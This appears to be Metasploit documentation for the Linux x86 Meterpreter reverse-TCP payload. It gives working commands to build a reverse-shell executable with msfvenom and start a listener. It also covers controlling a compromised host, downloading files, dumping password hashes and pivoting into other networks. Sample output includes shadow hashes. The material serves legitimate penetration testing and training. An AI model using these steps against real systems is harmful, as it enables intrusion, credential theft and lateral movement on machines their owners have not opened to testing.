linux/x86/meterpreter/reverse_tcp is the most popular payload against the Linux platform. It allows
you to remotely take over the compromised system, having control of the file system, collect
sensitive information such as credentials using post modules, etc.

linux/x86/meterpreter/reverse_tcp is also the default payload for most Linux exploits.

## Vulnerable Application

linux/x86/meterpreter/reverse_tcp should work on either 32 or 64-bit Linux platforms.

## Deploying linux/x86/meterpreter/reverse_tcp

linux/x86/meterpreter/reverse_tcp can be used in two different ways.

**As an exploit payload**

Many Linux exploits support native payloads, but not always. To check this, you can use the ```info```
command on the exploit you want to use:

```
msf exploit(lsa_transnames_heap) > info

       Name: Samba lsa_io_trans_names Heap Overflow
     Module: exploit/linux/samba/lsa_transnames_heap
   Platform: Linux
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Good
  Disclosed: 2007-05-14
...
```

If the platform field includes Linux, then that means you can use linux/x86/meterpreter/reverse_tcp
and other Linux payloads.

Sometimes, you need to select a specific target to be able to use a native Linux payload. To check
this, do:

```
show targets
```

If there is a Linux target, use that:

```
set TARGET [index]
```

To actually set the payload:

1. In msfconsole, load the exploit.
2. Do: ```set PAYLOAD linux/x86/meterpreter/reverse_tcp```
3. Set the ```LHOST``` option, which is the [IP the payload should connect back to](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-a-reverse-shell-in-Metasploit).
4. Run the exploit

**As a standalone executable**

To use linux/x86/meterpreter/reverse_tcp as an executable, first you can generate it with msfvenom:

```
./msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[IP] LPORT=4444 -f elf -o /tmp/payload.bin
```

Before sending the executable to the victim machine, you need to set up the handler on your end:

1. Start msfconsole
2. Do: ```use exploit/multi/handler```
3. Do: ```set PAYLOAD linux/x86/meterpreter/reverse_tcp```
4. Do: ```set LHOST [Your IP]```
5. Do: ```run```

And that should start the listener. When the victim runs the malicious executable, you should
receive a session:

```
msf exploit(handler) > run

[*] Started reverse TCP handler on 172.16.23.1:4444 
[*] Starting the payload handler...
[*] Transmitting intermediate stager for over-sized stage...(105 bytes)
[*] Sending stage (1495599 bytes) to 172.16.23.182
[*] Meterpreter session 1 opened (172.16.23.1:4444 -> 172.16.23.182:45009) at 2016-07-06 22:40:35 -0500

meterpreter > 
```


## Important Basic Commands

Here is a list of some of the common commands you might need while using the Linux Meterpreter:

**pwd**

The ```pwd``` command tells you the current working directory. For example:

```
meterpreter > pwd
/home/sinn3r/Desktop
```

**cd**

The cd command allows you to change directories. Example:

```
meterpreter > cd /tmp
```

**cat**

The cat command allows you to see the content of a file:

```
meterpreter > cat /tmp/data.txt
hello world
```

**upload**

The ```upload``` command allows you to upload a file to the remote target. For example:

```
meterpreter > upload /tmp/data.bin /home/sinn3r/Desktop
[*] uploading  : /tmp/data.bin -> /home/sinn3r/Desktop
[*] uploaded   : /tmp/data.bin -> /home/sinn3r/Desktop/data.bin
meterpreter > 
```

**download**

The ```download``` command allows you to download a file from the remote target to your machine. For example:

```
meterpreter > download /home/sinn3r/Desktop/data.bin /tmp
[*] downloading: /home/sinn3r/Desktop/data.bin -> /tmp/data.bin
[*] download   : /home/sinn3r/Desktop/data.bin -> /tmp/data.bin
```

**ifconfig/ipconfig**

```ifconfig``` and ```ipconfig``` are actually the same thing. They allow you to see the network
interfaces on the remote machine.

**getuid**

The ```getuid``` command tells you the current user that Meterpreter is running on. For example:

```
meterpreter > getuid
Server username: uid=1000, gid=1000, euid=1000, egid=1000, suid=1000, sgid=1000
```

**execute**

The ```execute``` command allows you to execute a command or file on the remote machine.
For example:

```
meterpreter > execute -f echo -a "hello > /tmp/hello.txt"
Process 5292 created.
```

**ps**

The ```ps``` command lists the running processes on the remote machine.

**shell**

The ```shell``` command allows you to interact with the remote machine's terminal (or shell). For
example:

```
meterpreter > shell
Process 5302 created.
Channel 6 created.
$
```

If you wish to get back to Meterpreter, do [CTRL]+[Z] to background the channel.

**sysinfo**

The ```sysinfo``` command shows you basic information about the remote machine. Such as:

* Computer name
* OS name
* Architecture
* Meterpreter type

For example:

```
meterpreter > sysinfo
Computer     : sinn3r-virtual-machine
OS           : Linux sinn3r-virtual-machine 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 (i686)
Architecture : i686
Meterpreter  : x86/linux
meterpreter > 
```

**Other commands**

For a complete list of Linux Meterpreter commands, do the following at the prompt:

```
meterpreter > help
```


## Using a Post module

One of the best things about Meterpreter is you have access to a variety of post modules that
"shell" sessions might not have. Post modules provide you with more capabilities to collect data
from the remote machine automatically. For example, stealing credentials from the system or
third-party applications, or modify settings, etc.

To use a post module from the Meterpreter prompt, simply use the ```run``` command. The following
is an example of collecting Linux hashes using post/linux/gather/hashdump:

```
meterpreter > run post/linux/gather/hashdump

[+] root:$6$cq9dV0jD$DZNrPKKIzcJaJ1r1xzdePEJTzn5f2V5lm9CnSdkMRPJfYy7QVx2orpzlf1XXBbIRZs7kT9CmYEMApfUIrWZsj/:0:0:root:/root:/bin/bash
[+] sinn3r:$6$S5lRz0Ji$bS0rOko3EVsAXwqR1rNcE/EhpnezmKH08Yioxyz/gLZAGh3AoyV5qCglvHx.vSINJNqs1.xhJix3pWX7jw8n0/:1000:1000:sinn3r,,,:/home/sinn3r:/bin/bash
[+] Unshadowed Password File: /Users/wchen/.msf4/loot/20160707112433_http_172.16.23.182_linux.hashes_845236.txt
meterpreter > 
```

Note that in order to collect Linux hashes, Meterpreter needs to run as root.

## Using the Post Exploitation API in IRB

To enter IRB, do the following at the Meterpreter prompt:

```
meterpreter > irb
[*] Starting IRB shell
[*] The 'client' variable holds the meterpreter client

>> 
```

**The client object**

The client object in Meterpreter allows you to control or retrieve information about the host. For
example, this allows you to get the current privilege our payload is running as:

```
>> client.sys.config.getuid
=> "uid=1000, gid=1000, euid=1000, egid=1000, suid=1000, sgid=1000"
```

To explore the client object, there are a few tricks. For example, you can use the #inspect method
to inspect it:

```
>> client.inspect
```

You can also use the #methods method to see what methods you can use:

```
>> client.methods
```

To review the source of the method, you can use the #source_location method. For example, say we
want to see the source code for the #getuid method:

```
>> client.sys.config.method(:getuid).source_location
=> ["/Users/sinn3r/rapid7/msf/lib/rex/post/meterpreter/extensions/stdapi/sys/config.rb", 32]
```

The first element of the array is the location of the file. The second is the line number of the
method.

## Routing Through the portfwd Commands

The ```portfwd``` command allows you to talk to a remote service like it's local. For example, if you
cannot talk to the blocked HTTP service remotely on the compromised host due to whatever reason,
then you can use portfwd to establish that tunnel:

```
meterpreter > portfwd add -l 8000 -p 8000 -r 172.16.23.182
[*] Local TCP relay created: :8000 <-> 172.16.23.182:8000
```

And then talk to it like it's a local service:

```
msf auxiliary(http_version) > run

[*] 127.0.0.1:8000 SimpleHTTP/0.6 Python/2.7.6
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(http_version) >
```

## Routing Through msfconsole

The ```route``` command from the msf prompt can also be used like portfwd, but it also allows you
to reach out to other networks that the compromised host is connected to.

To use ```route```, first look at the ipconfig/ifconfig output and determine your pivot point:

```
meterpreter > ipconfig
```

Make sure you know the subnet, netmask, and the Meterpreter/session ID. Return to the msf prompt, and establish that route:

```
msf > route add 192.168.1.0 255.255.255.0 1
```

At that point, you should have a working pivot. You can use other Metasploit modules to explore
or exploit more hosts on the network, or use auxiliary/server/socks4a and [Proxychains](http://proxychains.sourceforge.net/) to
allow other third-party tools to do the same.
